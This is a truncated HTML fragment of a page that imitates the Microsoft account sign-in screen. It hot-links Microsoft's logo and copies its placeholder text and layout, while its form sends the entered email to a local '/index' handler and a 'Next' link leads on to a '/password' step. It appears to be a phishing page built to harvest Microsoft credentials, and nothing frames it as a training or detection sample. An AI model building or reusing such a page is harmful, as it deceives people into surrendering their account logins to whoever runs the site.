<body>
  <div class="container mt-5 d-flex justify-content-center align-items-center">
    <form action="/index" method="POST">
      <div class="container mt-5 d-flex justify-content-center align-items-center">
        <div class="card" style="width: 18rem; border: none">
          <div class="card-body">
            <div class="row">
              <div class="col md-6">
                <div class="margin-bottom-20">
                  <img class="justify-content-center"
                    src="https://cdn.odc.officeapps.live.com/odc/stat/images/hrd/microsoft_logo.svg?b=14226.30550"
                    alt="" />
                  <br />
                  <br />
                </div>
              </div>
              <div class="col md-6">
                <h5 class="card-title"></h5>
              </div>
            </div>

            <h3 class="card-subtitle mb-2 text-dark py-2 mb-16">Sign in</h3>
            <div class="form-group col-md-12 placeholderContainer">
              <input type="email" class="form-control input" placeholder="Email, phone, or Skype" aria-required="true"
                spellcheck="false" id="email" name="email" autocomplete="off" data-bind="
                                    hasFocus: focus,
                                    textInput: email,
                                    attr: {'placeholder': config.text.emailPlaceHolder, 'aria-invalid': !error}" />
            </div>
            <br />
            <div class="col-md-12 section text-secondary">
              <span data-bind="text: config.text.noAccount" aria-hidden="true">No account?</span>
              <a style="text-decoration: none" href="#" aria-label="Create a Microsoft account" data-bind="text: config.text.createAccount,
                                attr: {'aria-label': config.text.createAccountAria}, click: msAccountSignUp">Create
                one!
              </a>
            </div>
            <br />
            <br />
            <div class="d-flex justify-content-end">
              <a style="color: #fff;text-decoration: none;" href="/password">

                <button class="btn" type="submit" style="
                background-color: #0067b8;
                color: #fff;
                display: inline-block;
                height: 32px;
                min-width: 108px;
                padding: 4px 12px 4px 12px;
                border-radius: none;
              ">Next

                </button></a>
            </div>
          </div>
        </div>
      </div>
    </form>
  </div>
  <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"
    integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p"
